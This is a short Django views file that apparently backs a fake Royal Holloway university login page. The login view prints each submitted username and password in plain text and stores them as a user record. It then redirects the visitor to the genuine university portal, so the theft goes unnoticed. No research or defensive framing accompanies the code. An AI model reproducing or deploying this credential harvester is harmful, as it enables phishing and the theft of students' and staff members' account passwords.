from django.http import HttpResponse
from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from django.db import IntegrityError


def test(request):
    return render(request, 'royal-holloway/login.html')


def username_exitst(username):
    if User.objects.filter(username=username).exists():
        return True
    return False


def login_request(request):
    print(request.get_host())
    username = request.POST['UserName']
    password = request.POST['Password']
    print(username)
    print(password)
    response = redirect('https://lum-prod.ec.royalholloway.ac.uk/')
    try:
        user = User.objects.create_user(username, password, password)
        user.save()
        return response
    except IntegrityError:
        return response